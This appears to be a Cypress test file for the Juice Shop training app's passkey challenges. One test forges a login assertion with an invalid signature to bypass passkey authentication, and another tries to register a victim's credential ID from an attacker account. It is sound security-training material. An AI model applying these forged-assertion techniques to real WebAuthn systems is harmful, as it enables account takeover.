describe('/', () => {
  // Neither exploit payload can be produced by a real or virtual authenticator, so both are sent as raw requests.

  describe('challenge "passkeySignatureChallenge"', () => {
    it('should solve by submitting a login assertion with an invalid signature', () => {
      cy.request({
        method: 'POST',
        url: '/rest/passkey/login-options',
        body: { email: 'passkey-user@juice-sh.op' }
      }).then((optionsResponse) => {
        const { challenge } = optionsResponse.body.options
        const { authToken } = optionsResponse.body

        cy.task('ForgePasskeyAssertion', { challenge }).then((assertion) => {
          cy.request({
            method: 'POST',
            url: '/rest/passkey/login-verify',
            body: { assertion, authToken }
          }).then((verifyResponse) => {
            expect(verifyResponse.body.authentication.token).to.be.a('string')
          })
        })
      })

      cy.expectChallengeSolved({ challenge: 'Passkey Bypass' })
    })
  })

  describe('challenge "passkeyCredentialOverwriteChallenge"', () => {
    it("should reject registering the victim's credential ID from another account", () => {
      const attacker = { email: `passkey-attacker-${Date.now()}@juice-sh.op`, password: 'attacker123' }

      cy.request({
        method: 'POST',
        url: '/api/Users',
        body: { ...attacker, passwordRepeat: attacker.password }
      })

      cy.request({
        method: 'POST',
        url: '/rest/user/login',
        body: attacker
      }).then((loginResponse) => {
        const attackerToken = loginResponse.body.authentication.token

        cy.request({
          method: 'GET',
          url: '/rest/passkey/register-options',
          headers: { Authorization: `Bearer ${attackerToken}` }
        }).then((optionsResponse) => {
          const { challenge } = optionsResponse.body.options
          const { regToken } = optionsResponse.body

          cy.task('ForgePasskeyAttestation', { challenge }).then(({ attestation }: any) => {
            cy.request({
              method: 'POST',
              url: '/rest/passkey/register-verify',
              headers: { Authorization: `Bearer ${attackerToken}` },
              body: { attestation, regToken },
              failOnStatusCode: false
            }).then((verifyResponse) => {
              expect(verifyResponse.status).to.equal(409)
            })
          })
        })
      })
    })
  })
})
